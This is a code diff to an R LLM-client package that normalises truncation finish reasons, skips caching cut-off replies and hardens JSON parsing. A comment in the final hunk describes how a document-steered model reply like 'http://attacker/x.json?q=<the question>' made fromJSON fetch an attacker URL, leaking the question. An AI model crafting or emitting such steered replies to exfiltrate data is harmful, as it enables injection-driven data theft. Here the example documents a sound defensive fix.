@@ -411,7 +411,9 @@ gr_result <- function(ok, text = "", error = NULL, status = NA_integer_,
     status = status,
     usage = usage,
     model = model,
-    finish_reason = finish_reason,
+    # One spelling for a reply cut off at the output cap, whoever sent it; see
+    # normalise_finish_reason().
+    finish_reason = normalise_finish_reason(finish_reason),
     retryable = isTRUE(retryable),
     raw = raw,
     # TRUE when the response came from a cache or a recording rather than the
@@ -422,11 +424,32 @@ gr_result <- function(ok, text = "", error = NULL, status = NA_integer_,
   ), class = "gr_result")
 }
 
+#' The provider spellings of "the reply was cut off at the output cap".
+#'
+#' Chat Completions says `length`; the Responses API sets `status` to
+#' `incomplete` with `incomplete_details.reason` `max_output_tokens`; Anthropic
+#' says `max_tokens`, Gemini `MAX_TOKENS`, and ellmer normalises to `max_tokens`
+#' or `context_window`. Callers checked for `length` alone, so on the default
+#' Responses API and on every ellmer provider a cut-off reply looked complete:
+#' `gr_synthesise()` kept a revision that ended mid-sentence. `incomplete` with
+#' no reason given is read as cut off too -- the provider itself says the reply
+#' is not whole, and treating it as complete is the direction that misleads.
+#' @noRd
+.gr_truncation_reasons <- c("length", "max_tokens", "max_output_tokens", "incomplete",
+                            "context_window", "model_context_window_exceeded")
+
+#' @noRd
+normalise_finish_reason <- function(x) {
+  x <- as_chr1(x, NA_character_)
+  if (!is.na(x) && tolower(x) %in% .gr_truncation_reasons) "length" else x
+}
+
 #' @export
 print.gr_result <- function(x, ...) {
-  cat(sprintf("<gr_result> ok=%s model=%s in=%s out=%s%s%s\n",
+  cat(sprintf("<gr_result> ok=%s model=%s in=%s out=%s%s%s%s\n",
               x$ok, as_chr1(x$model, "?"), x$usage$input %||% 0, x$usage$output %||% 0,
               if (isTRUE(x$cached)) " cached" else "",
+              if (identical(x$finish_reason, "length")) " truncated" else "",
               if (!x$ok) paste0(" error=", as_chr1(x$error)) else ""))
   if (nzchar(x$text)) cat(substr(x$text, 1, 400), if (nchar(x$text) > 400) " ..." else "", "\n")
   invisible(x)
@@ -453,6 +476,11 @@ print.gr_result <- function(x, ...) {
 #'   content filter) is reported as `ok = FALSE`, so an empty completion is never
 #'   passed downstream as evidence. `$cached` is `TRUE` when the response came
 #'   from a [gr_cache()] or a [gr_replay_client()] instead of the network.
+#'   A reply cut off at the output cap keeps `ok = TRUE`, since its text is what
+#'   the model wrote, but always carries `finish_reason = "length"`, whatever the
+#'   provider called it (`"max_tokens"`, `"MAX_TOKENS"`, a Responses API status
+#'   of `"incomplete"`); check for it wherever a complete reply matters. Such a
+#'   reply is not written to a [gr_cache()].
 #' @seealso [gr_client()], [gr_mock_client()], [gr_result], [gr_budget()],
 #'   [gr_cache_client()], [gr_replay_client()]
 #' @export
@@ -532,7 +560,12 @@ client_dispatch <- function(client, messages, model, max_output, temperature,
     key <- cache_key(client, messages, model, max_output, temperature,
                      schema, schema_name, extra)
     hit <- cache_get(cache, key)
-    if (!is.null(hit)) return(hit)
+    if (!is.null(hit)) {
+      # Entries are stored as built. One written before the truncation
+      # spellings were unified can still say "incomplete" or "max_tokens".
+      hit$finish_reason <- normalise_finish_reason(hit$finish_reason)
+      return(hit)
+    }
   }
 
   res <- if (inherits(client, "gr_mock_client")) {
@@ -550,7 +583,13 @@ client_dispatch <- function(client, messages, model, max_output, temperature,
     out
   }
 
-  if (inherits(cache, "gr_cache") && isTRUE(res$ok)) cache_put(cache, key, res)
+  # A reply cut off at the cap is not stored either. It is an incomplete answer,
+  # and caching it made the cut permanent: every later run replayed the same
+  # half sentence instead of asking again.
+  if (inherits(cache, "gr_cache") && isTRUE(res$ok) &&
+      !identical(res$finish_reason, "length")) {
+    cache_put(cache, key, res)
+  }
   res
 }
 
@@ -682,7 +721,18 @@ build_request_body <- function(client, messages, model, max_output, temperature,
     }
   } else {
     body <- list(model = model, messages = lapply(messages, function(m)
-      list(role = m$role, content = m$content)), max_tokens = max_output)
+      list(role = m$role, content = m$content)))
+    # Reasoning models reject `max_tokens` on Chat Completions with a 400 and
+    # take `max_completion_tokens` instead -- the same kind of rule as the
+    # temperature one above. Other models keep `max_tokens`, which every
+    # OpenAI-compatible server understands. A limit field the caller names in
+    # `extra_body` replaces this one rather than joining it, so a gateway that
+    # wants the other spelling is not sent both.
+    limit_field <- if (isTRUE(info$reasoning)) "max_completion_tokens" else "max_tokens"
+    named <- c(names(client$extra_body %||% list()), names(extra %||% list()))
+    if (!any(c("max_tokens", "max_completion_tokens") %in% named)) {
+      body[[limit_field]] <- max_output
+    }
     if (!is.null(temperature)) body$temperature <- temperature
     if (!is.null(schema)) {
       body$response_format <- list(type = "json_schema",
@@ -800,7 +850,15 @@ parse_response <- function(resp, api) {
     output = int1(fld(ug, "output_tokens") %||% fld(ug, "completion_tokens") %||% NA_integer_)
   )
   ch <- fld(parsed, "choices")
-  finish <- as_chr1(fld(parsed, "status") %||%
+  status <- fld(parsed, "status")
+  # A Responses API reply cut off at `max_output_tokens` has status
+  # "incomplete" and says why in `incomplete_details`. The reason is what
+  # tells a truncated reply from a filtered one, so it is what is kept;
+  # gr_result() then maps the truncation spellings to "length".
+  if (identical(as_chr1(status), "incomplete")) {
+    status <- fld(fld(parsed, "incomplete_details"), "reason") %||% status
+  }
+  finish <- as_chr1(status %||%
                     (if (is.list(ch) && length(ch) && is.list(ch[[1]])) fld(ch[[1]], "finish_reason")) %||%
                     NA_character_, NA_character_)
 
@@ -1006,13 +1064,21 @@ gr_call_json <- function(client, messages, schema, schema_name = "result",
                          allow_empty = FALSE, ...) {
   res <- gr_call(client, messages, schema = schema, schema_name = schema_name, ...)
   if (!res$ok) return(list(ok = FALSE, value = NULL, result = res))
-  val <- tryCatch(jsonlite::fromJSON(res$text, simplifyVector = TRUE),
-                  error = function(e) NULL)
+  # parse_json(), never fromJSON(). Given a short string that is not valid
+  # JSON, fromJSON() treats it as a LOCATION: text starting http:// or https://
+  # is downloaded, and a path that exists is opened. This text is the model's
+  # reply, which a document can steer, so a reply of
+  # "http://attacker/x.json?q=<the question>" made this machine send that
+  # request and then recorded whatever came back as the model's decision, and a
+  # reply naming a FIFO hung the run. parse_json() only parses; with
+  # simplifyVector = TRUE it simplifies exactly as fromJSON() did.
+  parse <- function(txt) tryCatch(jsonlite::parse_json(txt, simplifyVector = TRUE),
+                                  error = function(e) NULL)
+  val <- parse(res$text)
   if (is.null(val)) {
     # Some endpoints wrap JSON in a code fence even under strict mode.
     stripped <- gsub("^\\s*```(?:json)?\\s*|\\s*```\\s*$", "", res$text, perl = TRUE)
-    val <- tryCatch(jsonlite::fromJSON(stripped, simplifyVector = TRUE),
-                    error = function(e) NULL)
+    val <- parse(stripped)
   }
   # A bare 7, "text", [1,2,3] or true is valid JSON but not an object. Callers
   # index into `value` with `$`, which errors on an atomic vector, so anything
